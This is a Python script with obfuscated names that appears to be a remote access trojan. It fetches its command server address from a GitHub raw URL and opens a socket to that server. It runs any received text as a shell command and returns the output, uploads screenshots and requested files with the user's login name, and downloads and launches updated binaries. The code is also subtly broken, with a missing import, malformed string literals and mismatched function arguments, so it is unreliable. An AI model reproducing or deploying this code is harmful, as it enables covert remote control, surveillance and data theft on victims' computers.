import sys,subprocess,socket,time,requests
from PIL import ImageGrab
iCejfvP = "04.12.24.2"
udmcLZDpZU = ""
ilGgqTvsOkcgWOmc = ""
gxGVnmVYuVcBfHvKF = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
IGpFsNg = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
aHwzlOZyVrLrnZtzK = "!"
def svQXzymNjKTVDme(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def aVuVnvm(s):
	XKNHBcSUPLBNZz = s.recv(1024)
	if len(XKNHBcSUPLBNZz)==0:
		return True
	uYgkknbPUPKdxHg = XKNHBcSUPLBNZz.decode("utf-8")
	if not uYgkknbPUPKdxHg.startswith(aHwzlOZyVrLrnZtzK):
		proc = subprocess.run(XKNHBcSUPLBNZz.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	XEOrbzDqjSNELVQhg = uYgkknbPUPKdxHg.split(" ")[0][1:]
	if XEOrbzDqjSNELVQhg == "download":
		KLnqOqNxBGtgxpV(s, uYgkknbPUPKdxHg)
	elif XEOrbzDqjSNELVQhg == "screenshot":
		vQzzMAf(s)
	elif XEOrbzDqjSNELVQhg == "lHleGTpoatvFeKDwh":
		s.send(bytes(iCejfvP, "utf-8"))
def KLnqOqNxBGtgxpV(s, uYgkknbPUPKdxHg):
	orPVyJy = uYgkknbPUPKdxHg.replace(aHwzlOZyVrLrnZtzK+"screenshot ", "").split(",")
	results = []
	for f in orPVyJy:
		results += suvndrXuEvhDwtmLCcTgMu(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def vQzzMAf(uYgkknbPUPKdxHg):
	loboSrOFALVKrnClE = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	loboSrOFALVKrnClE.save(fpath)
	loboSrOFALVKrnClE.close()
	r = suvndrXuEvhDwtmLCcTgMu(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def suvndrXuEvhDwtmLCcTgMu(HLZBvPiwnZHwezG, yvxafEMNUWxgtydkLm, IpbMuuEyAZjrX=None):
	if not os.path.exists(HLZBvPiwnZHwezG):
		return "FILE NOT FOUND: "+HLZBvPiwnZHwezG
	headers = {"user":os.getlogin()}
	if IpbMuuEyAZjrX is not None:
		headers = {**headers, **IpbMuuEyAZjrX}
	requests.post(udmcLZDpZU+":"+ilGgqTvsOkcgWOmc+"/"+yvxafEMNUWxgtydkLm,
		files={open(HLZBvPiwnZHwezG, "rb")},
		headers=headers)
	return "SUCCESS"
def sUadBLMEAv():
	if udmcLZDpZU == "" or ilGgqTvsOkcgWOmc == "":
		XKNHBcSUPLBNZz = requests.get(gxGVnmVYuVcBfHvKF).text.replace("\n","").split(":")
		udmcLZDpZU = XKNHBcSUPLBNZz[0].strip()
		ilGgqTvsOkcgWOmc = XKNHBcSUPLBNZz[1].strip()
		lHleGTpoatvFeKDwh = XKNHBcSUPLBNZz[2].strip()
	return udmcLZDpZU, ilGgqTvsOkcgWOmc, lHleGTpoatvFeKDwh
def WSrXyGyHLObvBsyP():
	RbvIkRWnWLTGDpUPW = os.path.basename(__file__)
	fileType = RbvIkRWnWLTGDpUPW.split(".")[-1]
	NQPavHKKfOC = RbvIkRWnWLTGDpUPW.replace(fileType,"") +"."+iCejfvP + fileType
	XypohPljuhchomWpgmiJ = os.path.join(os.path.getcwd(), NQPavHKKfOC)
	with open(NQPavHKKfOC, "wb+") as f:
		f.write(requests.get(IGpFsNg+"/file"+XypohPljuhchomWpgmiJ.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+XypohPljuhchomWpgmiJ)
	elif fileType == ".pyw":
		os.system("python "+XypohPljuhchomWpgmiJ")
def EZzVgLwGtjBZhDdUrhJKzdV():
	pass
def tekbYoJeonPl():
	h, p, v = sUadBLMEAv()
	if iCejfvP != v:
		WSrXyGyHLObvBsyP()
	EZzVgLwGtjBZhDdUrhJKzdV()
	while True:
		try:
			while True:
				HqhiczHSJ=False
				try:
					s=svQXzymNjKTVDme(h, p)
					while not HqhiczHSJ:
						s.send(b"\n>> ")
						HqhiczHSJ=aVuVnvm(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(tekbYoJeonPl())
